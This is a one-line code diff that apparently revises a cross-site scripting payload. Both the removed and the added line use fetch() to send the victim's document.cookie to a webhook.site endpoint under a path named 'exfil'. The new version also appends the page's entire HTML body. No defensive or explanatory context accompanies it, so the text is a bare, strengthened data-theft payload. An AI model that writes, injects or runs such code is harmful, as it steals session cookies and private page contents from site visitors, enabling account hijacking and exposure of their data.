@@ -1,1 +1,1 @@
-fetch('https://webhook.site/39b226d4-f904-47c4-81fa-28fb8924387a/exfil?c='+document.cookie)
+fetch('https://webhook.site/39b226d4-f904-47c4-81fa-28fb8924387a/exfil?c='+document.cookie+'&h='+encodeURIComponent(document.body.innerHTML))
